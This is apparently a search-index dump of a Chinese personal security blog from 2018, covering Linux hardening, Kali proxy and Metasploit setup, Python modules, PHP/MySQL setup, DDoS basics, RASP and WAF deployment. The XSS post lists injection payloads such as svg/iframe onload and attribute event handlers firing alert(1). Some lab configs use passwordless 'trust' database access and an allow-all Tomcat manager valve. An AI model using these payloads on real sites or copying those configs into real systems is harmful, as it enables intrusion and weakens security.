用户上传文件后应该经过杀毒软件的扫描，如果是病毒文件，应该放置到隔离的文件中，做为审计资料，如果不是，应该由临时文件夹移动到正式文件夹","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://yoursite.com/tags/文件上传漏洞/"}]},{"title":"Kali下配置ss服务","slug":"Kali下配置ss服务","date":"2018-06-25T14:17:29.000Z","updated":"2018-06-30T11:48:40.886Z","comments":true,"path":"2018/06/25/Kali下配置ss服务/","link":"","permalink":"http://yoursite.com/2018/06/25/Kali下配置ss服务/","excerpt":"","text":"步骤 首先你必须要有一个ss服务器 安装shadowsocks 1pip install shadowsocks 修改python包错误 123456789vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py将第52行libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)改为libcrypto.EVP_CIPHER_CTX_reset.argtypes = (c_void_p,)再次搜索cleanup（全文件共2处，此处位于111行），将libcrypto.EVP_CIPHER_CTX_cleanup(self._ctx)改为libcrypto.EVP_CIPHER_CTX_reset(self._ctx)save and restart shadowsocks service 增加ss服务器配置 12345678910&#123; &quot;server&quot;:&quot;服务器地址&quot;, &quot;server_port&quot;:服务器端口号, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, password&quot;:&quot;密码&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;加密方式&quot;, &quot;fast_open&quot;: true, &quot;workers&quot;: 1&#125; 启动服务 1sslocal -c /etc/shadowsocks.json 配置 /etc/proxychains.conf 12socks5 127.0.0.1 1080 使用proxychains启动应用程序 12proxychains firefox www.google.comproxychains msfconsole","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"4-Linux的远程认证","slug":"4-Linux的远程认证","date":"2018-06-24T07:35:37.000Z","updated":"2018-06-24T07:39:16.221Z","comments":true,"path":"2018/06/24/4-Linux的远程认证/","link":"","permalink":"http://yoursite.com/2018/06/24/4-Linux的远程认证/","excerpt":"","text":"增强ssh安全性 改变ssh的端口 1234567cp /ect/ssh/sshd_onfig /etc/ssh/sshd_config.backupvim /etc/ssh/sshd_config...Port 3333service sshd restart 禁止root直接登录 12345vim /etc/ssh/sshd_config...PermissionRootLogin no...service sshd restart 只允许一部分用户登录 123456vim /etc/ssh/sshd_config...AllowUsers user1 user2...service sshd restart 使用密钥登录服务器 123456781. 首先在本地生成一个私钥和公钥。客户端ssh-keygen-t rsa2. 将客户端的公钥上传到服务器端ssh-copy-id -p 33 linux@172.16.190.9013. 登录ssh -p 33 linux@172.111.111.111 禁止密码登录 123456vim /etc/ssh/sshd_config...PasswordAuthentication no...service sshd restart","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"3-Linux的本地认证","slug":"3-Linux的本地认证","date":"2018-06-24T07:35:11.000Z","updated":"2018-06-24T07:36:23.439Z","comments":true,"path":"2018/06/24/3-Linux的本地认证/","link":"","permalink":"http://yoursite.com/2018/06/24/3-Linux的本地认证/","excerpt":"","text":"概述 [x] 用户认证和日志记录 [x] 限制用户登录的能力 [x] 使用acct监视用户行为 [x] 定义用户授权控制 [ ] 使用USB设备和PAM进行登录 日志记录 /var/log 存放着各种log 查看特定账号的错误登录尝试 1lastb root 查看内存中缓存的内核信息 1dmesg 查看最近某用户登录信息 1last 查看最后一次登录 1lastlog 限制用户登录 123456usermod -s /usr/bim/nologin user1passwd -l user1usermod -l user1# 解锁passwd -u user1usermod -u user1 使用acct监视用户 1234apt-get install acct查询特定用户执行过的命令lastcomm root 定义用户用户授权限制 123vim sudoers# 每次切换root权限都需要输入密码Defaults user1 timestamp_timeout=0 总结 这章，比较没写什么有价值的东西。单纯了解了一些linux的操作。","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"2-本地文件系统安全","slug":"2-本地文件系统安全","date":"2018-06-24T04:33:17.000Z","updated":"2018-06-24T04:39:13.889Z","comments":true,"path":"2018/06/24/2-本地文件系统安全/","link":"","permalink":"http://yoursite.com/2018/06/24/2-本地文件系统安全/","excerpt":"","text":"概述 [x] 使用chmod命令改变文件权限 [x] 使用访问控制列表 [ ] 在Ubuntu上安装一个LDAP chmod命令 除了以下的方式外，还可以使用八进制的方式来做权限控制，暂且不表。 命令参数 12345678u 代表文件或者目录的所有者 usersg 代表文件或者目录所属的组 groupso 代表文件或者目录外的其他 othersa 代表以上所有 allr 代表 读x 代表 执行w 代表 写 例子 123456789101112# 新建文件&gt;&gt; touch test.txt# 赋予执行的权限&gt;&gt; chmod u+x test.txt# 赋予组成员执行权限&gt;&gt; chmod g+x u+x test.txt# 收回权限&gt;&gt; chmod u-x test.txt# 将某个文件的权限复制给另一个文件&gt;&gt; chmod --reference=file1 file2# 递归添加权限&gt;&gt; chmod o+x -R /example 使用访问控制列表 获取权限控制信息 12345678linux@linux:~$ getfacl /usrgetfacl: Removing leading &apos;/&apos; from absolute path names# file: usr# owner: root# group: rootuser::rwxgroup::r-xother::r-x 操作指南 添加用户+组 123456789101112useradd user1useradd user2useradd user3passwd -d user1passwd -d user2passwd -d user3addgroup group1usermod -G group1 user1usermod -G group1 user2usermod -G group1 user3 user1 想把文件夹user1 分享给user2，但是不给user3 1234567mkdir accountschown user1 accountssu user1setfacl -m u:user1:rxw accountssetfacl -m u:user2:rwx accountssetfacl -m other:--- accounts 实验验证 123456root@linux:~# su user3$ cd /example$ lsaccounts$ cd accountssh: 3: cd: can&apos;t cd to accounts 对权限控制做备份 1234$ getfacl -R accounts &gt; accounts/permissions.acl $ cd accounts$ lspermissions.acl 恢复备份 1setfacl -- restore=permission.acl 总结 LADP暂时用不到，先不弄了。","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"1-Linux中的安全问题","slug":"1-Linux中的安全问题","date":"2018-06-24T02:04:07.000Z","updated":"2018-06-24T04:39:00.487Z","comments":true,"path":"2018/06/24/1-Linux中的安全问题/","link":"","permalink":"http://yoursite.com/2018/06/24/1-Linux中的安全问题/","excerpt":"","text":"概述 读书笔记 Linux的安全策略 对系统的访问能力 系统上安装软件的权限 数据的访问能力 故障恢复 检验安装介质的安全性 1234567891011121314# Linuxmd5sum ubuntu18.iso# windows CertUtil -hashfile xxxx.iso MD5# mac~/Downloads» md5 ubuntu18.iso MD5 (ubuntu18.iso) = 129292a182136a35e1f89c586dbac2e2---------------------------------官网md5：129292a182136a35e1f89c586dbac2e2 *ubuntu-18.04-desktop-amd64.iso 配置sudo访问 1234567891011useradd testgroupadd testgroupspasswd testvisudo ## Allow people in group test run all commandstest ALL=(ALL) ALLusermod -aG testgroups testsudo test - 使用namp扫描metasploitable2 12345# 首先下载metasploitable2https://sourceforge.net/projects/metasploitable/ # 安装kali系统# 设置kali系统的metasploitable# 使用进行扫描","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"}]},{"title":"在kali中配置metasploit","slug":"kali下配置metasploit","date":"2018-06-24T01:54:59.000Z","updated":"2018-06-27T15:25:46.554Z","comments":true,"path":"2018/06/24/kali下配置metasploit/","link":"","permalink":"http://yoursite.com/2018/06/24/kali下配置metasploit/","excerpt":"","text":"安装Kali系统 推荐使用虚拟机，太简单不赘述。 配置数据库 开启开机启动 12vim /etc/rc.local 添加/etc/init.d/postgresql start 启动数据库 12service postgresql start systemctl restart postgresql 创建新用户 1234&gt;&gt; su postgres&gt;&gt; pssql&gt;&gt; create user &quot;msfuser&quot; with password &apos;msfpassword&apos; nocreatedb;&gt;&gt; create database &quot;msfdb&quot; with owner=&quot;msfuser&quot;; 编辑database.yml文件 12345678&gt;&gt;cd /usr/share/metasploit-framework/config&gt;&gt; cp database.yml.example database.yml&gt;&gt; vim database.yml...database: msfdbusername: msfuserpassword:msfpassword... 编辑postgresql，本地启动 1234567891011121314&gt;&gt; cd /etc/postgresql/10/main&gt;&gt; cp pg_hba.conf pg_hba.conf.backup&gt;&gt; vim pg_hba.conf...# TYPE DATABASE USER ADDRESS METHOD# &quot;local&quot; is for Unix domain socket connections onlylocal all all trust# IPv4 local connections:host all all 127.0.0.1/32 trust# IPv6 local connections:host all all ::1/128 trust... 启动msf,查看状态 12&gt;&gt; msfconsole&gt;&gt; db_status Reference https://www.secpulse.com/archives/33281.html https://www.jianshu.com/p/9c82ccb2aaf7 https://blog.csdn.net/sanbingyutuoniao123/article/details/52209653 https://docs.kali.org/general-use/starting-metasploit-framework-in-kali","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"http://yoursite.com/tags/metasploit/"}]},{"title":"执行XSS代码","slug":"执行XSS代码","date":"2018-06-23T07:50:19.000Z","updated":"2018-06-25T11:20:01.005Z","comments":true,"path":"2018/06/23/执行XSS代码/","link":"","permalink":"http://yoursite.com/2018/06/23/执行XSS代码/","excerpt":"","text":"概述 前面简单的总结了一下xss的常见的攻击，搭建了xss平台。也算一个了解了，但对于xss执行，并没有总结一下有哪些方式，恰逢假日，又看到一篇文章，遂，总结如下。 概念 反射型xss 存储型xss DOM型xss UXSS MXSS UXSS： 一种针对浏览器的xss，比起普通的xss，其危害在于，它危害的是浏览器本身，譬如根据浏览器本身功能的缺陷，或者根据浏览器拓展的功能缺陷，生成并执行代码 Unlike the common XSS attacks, UXSS is a type of attack that exploits client-side vulnerabilities in the browser or browser extensions in order to generate an XSS condition, and execute malicious code. MXSS 指的是一些本来看起来没有危害的html/js代码，经过浏览器渲染，形成了有危害的xss代码，其英文全称为：Mutation-based Cross-Site-Scripting 突变性xss html xss 顾名思义，就是在html里面构造的xss。 一般就是闭合尖括号，然后植入脚本 123456789101112&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- &#123;&#123; user input &#125;&#125; --&gt; &lt;div&gt;&lt;/div&gt;&lt;svg onload=alert(1)&gt;&lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;iframe onload=alert(1)&gt;&lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;script src=&apos;xx.js&apos;&gt;&lt;/script&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 属性 xss 在html标签里面的属性，存在用户输入，从而造成的xss，可分为三种，双引号，单引号，无引号 12345678910111213141516&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- &#123;&#123; user input &#125;&#125; --&gt; &lt;input value=&quot;&quot; autofocus onfocus=&quot;alert(1)&quot;&gt; &lt;input value=&apos;&apos; onmouseover=&quot;alert(1)&quot; &lt;input value=&apos;&apos; autofocus onblur=&quot;alert(1)&quot;&gt;&lt;/body&gt;&lt;/html&gt;onfocus 将焦点放在input里面onmouseover 鼠标移入事件onblur 鼠标移出事件 URL xss 这种xss 一般存在与a 标签里面 12345678&lt;script src=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;/script&gt;&lt;a href=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;Click&lt;/a&gt;&lt;iframe src=&quot;&#123;&#123;userinput&#125;&#125;&quot; /&gt;&lt;base href=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;form action=&#123;&#123;userinput&#125;&#125;&gt;&lt;frameset&gt;&lt;frame src=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;/frameset&gt;javascript:alert(/xss/) Javascript xss 根据不同的js代码，进行构造，一般闭合大括号，引号等等。 总结 XSS也算很老的漏洞的了，但总是有人可以把它玩出花来。 reference https://www.acunetix.com/blog/articles/universal-cross-site-scripting-uxss/ http://imweb.io/topic/55e3c132771670e207a16bcf https://www.anquanke.com/post/id/148357","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-shutil","slug":"python模块-shutil","date":"2018-06-21T13:52:26.000Z","updated":"2018-06-21T13:52:51.734Z","comments":true,"path":"2018/06/21/python模块-shutil/","link":"","permalink":"http://yoursite.com/2018/06/21/python模块-shutil/","excerpt":"","text":"概述 shutil模块提供了基于文件和文件夹的更高维度的操作，例如复制和移除等等 文件操作 shutil.copyfile(src,dst,follow_symlinks=True) 复制一个文件 12# dst也必须是一个文件名.shutil.copyfile(&apos;D://new_folder2/test2/testsample.txt&apos;,&quot;D://new_folder2//testsample.txt&quot;) shutil.copy(src,dst,follow_symlinks=True) 针对文件，复制操作 1shutil.copy(&apos;D://new_folder2//test2//testsample.txt&apos;,&quot;D://new_folder2//testsample2.txt&quot;) shutil.copy2(src,dst,follow_symlinks=True) 类似copy，不同的是，这个copy会同样复制文件的元数据。元数据指的是一个文件的权限，大小，创建时间等等。 shutil.copytree(src,dst) 1shutil.copytree(src, dst, symlinks=False, ignore=None,copy_function=copy2, ignore_dangling_symlinks=False) 复制文件夹,底下的文件，文件夹都会被复制。 1shutil.copytree(&apos;D://new_folder2//test2&apos;,&quot;D://new_folder2//test222&quot;,copy_function=shutil.copy2) shutil.rmtree(path) 移除文件夹及底下的文件 1shutil.rmtree(&quot;D://new_folder2//test222&quot;) shutil.move(src,dst,copy_function=copy2) 递归移动一个文件或者文件夹到dst，然后返回路径 123shutil.move(&apos;D://new_folder2/test3&apos;,&apos;D://new_folder2/test4&apos;)&gt;&gt;&gt;&gt;返回D://new_folder2/test4\\test2 shutil.disk_usage(path) 返回以bytes为单位的磁盘使用情况 12print(shutil.disk_usage(&apos;D://&apos;))&gt;&gt;&gt;&gt; usage(total=84001771520, used=76966387712, free=7035383808) shutil.chown(path,user=None,group=None) 改变一个文件/文件夹的所有者 1shutil.chown(path,user,group) shutil.which(cmd) 显示可执行程序所在的路径 1shutil.which(&apos;python&apos;) 归档压缩操作 shutil.make_archive(basename,format,root_dir,base_dir) 123456basename: 要创建的压缩文件名，需要包含路径format： zip,tar,gztar,bztar,zxtarroot_dir: 先进去这个root_dir的目录，然后在压缩base_dir的所有东西base_dir: 路径的前缀shutil.make_archive(&quot;D://new_folder2/test3&quot;,&apos;zip&apos;,&apos;D://new_folder2/&apos;,&apos;D://new_folder2/test3&apos;) shutil.unpack_archive(filename,extract_dir,format) 解压缩 12# test1 不存在，但是会自动创建shutil.unpack_archive(&apos;D://new_folder2/test3.zip&apos;,&quot;D://new_folder2//test1&quot;,&quot;zip&quot;)","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"配置phpstorm","slug":"配置phpstorm","date":"2018-06-20T15:08:31.000Z","updated":"2018-06-20T15:51:10.621Z","comments":true,"path":"2018/06/20/配置phpstorm/","link":"","permalink":"http://yoursite.com/2018/06/20/配置phpstorm/","excerpt":"","text":"打开工具栏上面的Tools --&gt; Deployment --&gt; configuration 点击 Edit Configurations new 一个新的配置 写完代码，upload到localhost中。需要注意，当前用户需要对/var/www/html 这个文件夹有写入权限.然后点击运行。 参考 https://segmentfault.com/a/1190000003695273","categories":[{"name":"php","slug":"php","permalink":"http://yoursite.com/categories/php/"}],"tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"python模块-os","slug":"python模块-os","date":"2018-06-20T14:50:03.000Z","updated":"2018-06-20T15:53:51.364Z","comments":true,"path":"2018/06/20/python模块-os/","link":"","permalink":"http://yoursite.com/2018/06/20/python模块-os/","excerpt":"","text":"概述 这个模块提供了很多简单方便的方式去调用操作系统开放的功能，至于更高维度的文件，文件夹操作的方法需要参考 shutil 这个模块 在python中，文件名字，命令行参数，环境变量都是字符串。因此一些系统的字符转换就是必须的。可以使用 sys.getfilesystemencoding() 查看系统编码 系统 os.environ 返回环境变量 os.getenv(key) 得到key值的环境变量 os.uname() 相当于Linux的uname，得到系统的信息 12&gt;&gt;&gt; os.uname()(&apos;Linux&apos;, &apos;VM_16_8_centos&apos;, &apos;3.10.0-514.26.2.el7.x86_64&apos;, &apos;#1 SMP Tue Jul 4 15:04:05 UTC 2017&apos;, &apos;x86_64&apos;) os.getuid 123uid, os.getgidgid, os.getgroups() 返回当前进程相关的group os.getlogin() 得到当前登录的用户 os.popen(cmd,mode=‘r’,buffering=-1) 执行系统级别的命令，但是没有输出。 mode有 read和write两种模式。 但是常见的还是subprocess这个命令 1234import oswith os.popen(&apos;git clone https://github.com/zhuzhuyule/img_to_txt.git&apos;)as f: a = f.read()print(a) 文件夹操作 os.mkdir(path) 创建一个文件夹 os.rmdir(path) 移除文件夹 os.makedirs(path) 创建一系列文件夹 1os.makedirs(&apos;test/test/test&apos;) os.removedirs(path) 移除文件夹，包括子文件夹. 递归移除.如下，先移除最里面的test，然后是外层的test，最后在移除最外面的test 1os.removedirs(&apos;test/test/test&apos;) os.chdir(path) 变换路径 文件 os.listdir(path) 列出当前文件夹下面的所有文件和文件夹 os.scandir(path) 扫描当前路径下面的所有文件和文件夹，返回一个DirEntry对象。有以下属性 name path is_file is_dir inode is_symlink os.remove(path) path是文件的路径，注意，一定得是文件才能够删除。文件夹不能这样删 os.rename(src,dst) 在Unix 中，如果dst是个已经存在的文件，如果用户有权限，那么该文件会被没有提示的替换 在windows中，如果dst已经存在，那么就会出错，即使dst是个文件，而不是文件夹 rename具有移动文件夹（无论文件夹里面是否有文件），并且重命名的功能 123&gt;&gt;&gt; os.rename(&quot;d://New&quot;,&quot;d://new_folder&quot;) # 重命名&gt;&gt;&gt; os.rename(&quot;d://new_folder&quot;,&quot;new_folder2&quot;) # 将文件夹移动到当前目录并且改名&gt;&gt;&gt; os.renmae(&quot;new_folder2&quot;,&quot;d://new_folder&quot;) # 文件夹里面还有文件，也可以移动+改名 os.renames(old,new) 将old层级文件夹全部改名为new的层级文件夹 12345&gt;&gt;&gt; os.renames(&quot;d://new_folder2//test2//test2.txt&quot;,&quot;d://new_folder2//test1//test1.txt&quot;)此时 test2 文件夹会变成test1文件夹， test2.txt 会变成test1.txt而与rename不同的是： rename如果test2文件夹不存在，就会出错。（但是如果文件夹存在就不会出错） rename是不会出错的。不管文件夹存不存在。但是如果文件夹之前存在，他就会被改名消失。除非这个文件夹里面还有其他东西，这样这个文件夹就不会被改名消失。 os.walk(path) 返回一个generator对象，分别有三个值： root, dirs, files, 12345678910111213141516171819202122root ： 返回当前路径下所有文件夹的路径，字符串dirs： 返回一个list，返回当前路径下的文件夹名称，如果子文件夹还有文件夹，返回另外一个listfiles： 返回list，类似dirs，只不过返回的是文件名。&gt;&gt;&gt; for root,dirs,files in os.walk(&quot;d://new_folder2//&quot;): print(&quot;files: &quot;,files) print(&quot;root: &quot;,root) print(&quot;dirs: &quot;,dirs) files: [&apos;test.txt&apos;]root: d://new_folder2//dirs: [&apos;test1&apos;, &apos;test2&apos;]files: [&apos;test1.txt&apos;]root: d://new_folder2//test1dirs: []files: [&apos;test2.txt&apos;, &apos;testsample.txt&apos;]root: d://new_folder2//test2dirs: [&apos;teste233&apos;]files: []root: d://new_folder2//test2\\teste233dirs: [] os.replace() 这个是跨平台的os.rename 1234567891011# test1 是存在的文件夹#os.replace(&apos;D://new_folder2//test2/test2.txt&apos;,&quot;D://new_folder2//test1//test21.txt&quot;)# test5 是不存在的文件夹， 失败#os.replace(&apos;D://new_folder2//test4/test1.txt&apos;,&quot;D://new_folder2//test5//test51.txt&quot;)#成功#os.replace(&apos;D://new_folder2//test1&apos;,&quot;D://new_folder2//test4&quot;)# 成功# os.renames(&apos;D://new_folder2//test1/test21.txt&apos;,&quot;D://new_folder2//test3//test21.txt&quot;)","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"在ubuntu18下配置php开发环境","slug":"在ubuntu18下配置php开发环境","date":"2018-06-20T11:30:22.000Z","updated":"2018-06-24T04:32:52.707Z","comments":true,"path":"2018/06/20/在ubuntu18下配置php开发环境/","link":"","permalink":"http://yoursite.com/2018/06/20/在ubuntu18下配置php开发环境/","excerpt":"","text":"更新源 1234567891011121314sudo gedit /etc/apt/source.listdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversesudo apt-get update -y 安装apache 123sudo apt install apache2service apache2 statusservice apache2 restrat 安装php7 12sudo apt install php7.0php -v 安装mysql5.7 12345678910111213141516171819202122232425sudo apt install mysql-server # 更改密码sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf---加上...skip-grant-tables ...-----sudo service mysql restart mysql -u rootuse msyql;UPDATE user set plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos;;update user set authentication_string = password(&apos;qwe123&apos;), password_expired = &apos;N&apos;, password_last_changed = now() where user = &apos;root&apos;;flush privileges;select user, host, plugin from user where user=&apos;root&apos;;# 改回来配置+重启mysql -u root -p qwe123 安装php-admin 12345sudo apt-get install phpmyadmin php-mbstring php-gettext，安装的过程中选择apache2。sudo phpenmod mcryptsudo phpenmod mbstring修改完成之后sudo systemctl restart apache2重启apache2服务器。 测试 123打开浏览器http://localhost/phpmyadmin Reference https://segmentfault.com/a/1190000005786808 https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost","categories":[{"name":"php","slug":"php","permalink":"http://yoursite.com/categories/php/"}],"tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"4-DDoS了解","slug":"4-DDoS了解","date":"2018-06-18T12:19:53.000Z","updated":"2018-06-20T15:51:37.715Z","comments":true,"path":"2018/06/18/4-DDoS了解/","link":"","permalink":"http://yoursite.com/2018/06/18/4-DDoS了解/","excerpt":"","text":"概述 DDoS攻击分为流量型攻击和CC攻击，流量攻击主要是发送报文侵占正常业务的带宽，阻塞整个数据中心的出口，导致正常用户的访问无法到达。 CC攻击 主要针对某些业务频繁访问，激发大量消耗资源的数据库查询，文件IO，导致业务服务器CPU，或者IO出现瓶颈，无法提供正常的服务。 案例 TCP SYN FLOOD 一个正常的TCP需要三次握手，如下所示： 123客户端 --发送TCP SYN数据包--&gt;服务器分配控制块--返回SYN ACK数据包--&gt; 客户端 --返回 SYN ACK数据包--&gt; 服务器端--&gt; 服务器释放控制块如果客户端不返回SYN ACK数据包，或者不存在，那么就会造成TCP SYN 泛洪攻击 UDP FLOOD攻击 UDP 是没有连接状态的协议，因此可以发送大量的UDP请求，干扰正常应用。 反射型攻击 黑客伪造IP，向网络上大量开放特定服务的服务器进行请求，从而造成被伪造IP地址的服务器形成了DDoS攻击 解决方案 1, 流量清洗 2，流量压制","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"5-RASP安装","slug":"5-RASP安装","date":"2018-06-18T12:19:39.000Z","updated":"2018-06-20T15:51:43.888Z","comments":true,"path":"2018/06/18/5-RASP安装/","link":"","permalink":"http://yoursite.com/2018/06/18/5-RASP安装/","excerpt":"","text":"概述 RASP, 一种已探针的形式，将保护引擎注入到应用服务中，可在文件，数据库，网络等多个方面，对应用进行保护，当发生敏感的行为时，可以结合上下文的请求进行判断，阻断攻击，具有低误报率，低漏报率的优点 安装 这里使用的是百度开源的OpenRASP进行实验。下面是实验步骤 安装tomcat服务器 123456789101112131415161718192021222324yum install java -y下载tomcathttps://tomcat.apache.org/download-80.cgi配置manager页面vim conf/tomcat-users.xml&lt;role rolename=&quot;admin&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;role rolename=&quot;admin-script&quot;/&gt;&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;manager-script&quot;/&gt;&lt;role rolename=&quot;manager-jmx&quot;/&gt;&lt;role rolename=&quot;manager-status&quot;/&gt;&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;admin,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&quot;/&gt;添加远程访问vim conf/Catalina/localhost/manager.xml:&lt;Context privileged=&quot;true&quot; antiResourceLocking=&quot;false&quot; docBase=&quot;$&#123;catalina.home&#125;/webapps/manager&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;^.*$&quot; /&gt;&lt;/Context&gt; 下载漏洞程序 123456789https://sourceforge.net/projects/wavsep/进入tomcat的manager.html页面进行deploy(因为需要数据库，这里需要安装mysql。)然后打开http://192.168.31.39:8080/wavsep/wavsep-install/install.jsp 安装结束 安装openRASP 1java -jar RaspInstall.jar -install &lt;tomcat_root&gt; restart tomcat 总结 进行了漏洞测试，发现规则支持还不够强大，需要自己写一些规则，定制性高。","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"3-搭建WAF环境","slug":"3-搭建WAF环境","date":"2018-06-18T12:19:26.000Z","updated":"2018-06-20T15:51:32.216Z","comments":true,"path":"2018/06/18/3-搭建WAF环境/","link":"","permalink":"http://yoursite.com/2018/06/18/3-搭建WAF环境/","excerpt":"","text":"概述 针对HTTP/HTTPS的安全策略为web应用提供保护的产品，承担了sql注入，xss，远程命令执行，目录遍历等攻击的抵抗，是守护安全的第一道防线 优点 使用，配置简单方便 能够抵抗常见的扫描和常见的漏洞测探 缺点 防护能力不足以对抗黑产，依赖规则，针对未知攻击无应对方法，容易绕过 无法承担基础业务安全能力，比如褥羊毛行为，刷短信接口等 审计能力不足，出现事故无法提取较为详细的事件log记录等等 配置一个简单的WAF OpenResty 基于nginx与lua的高性能web平台，内部集成了大量精良的nginx模块，用于方便的搭建超高并发和拓展性极高的web应用，web服务和动态网管 123456789101112131415161718192021222324252627282930# 安装Debian 和 Ubuntu 用户推荐您使用 apt-get安装以下的开发库:apt-get install libpcre3-dev \\ libssl-dev perl make build-essential curlFedora 和 RedHat 用户推荐您使用yum安装以下的开发库:yum install pcre-devel openssl-devel gcc curl./configure然后在进入 openresty-VERSION/ 目录, 然后输入以下命令配置:./configure默认, --prefix=/usr/local/openresty 程序会被安装到/usr/local/openresty目录。您可以指定各种选项，比如./configure --prefix=/opt/openresty \\ --with-luajit \\ --without-http_redis2_module \\ --with-http_iconv_module \\ --with-http_postgres_module make或者make -j2 （双核编译）sudo make install waf https://github.com/unixhot/waf.git 配置反向代理 12345678910111213141516171819202122232425262728# openrestyhttp&#123; ... lua_shared_dict limit 50m; lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;; init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;; access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;;&#125;include &quot;/usr/local/openresty/nginx/conf/www.testwaf.com.conf&quot;;./nginx -s reload# www.testwaf.com.confupstream testwaf&#123; server 192.168.1.12:80;&#125;server &#123; listen 80; server_name www.testwaf.com; location / &#123; proxy_pass: http://testwaf; index index.html index.htm; &#125;&#125;# 最好使用root权限安装 总结 重点还是学习waf是怎么写的，后面在仔细研究下源码。 Reference https://openresty.org/cn/ 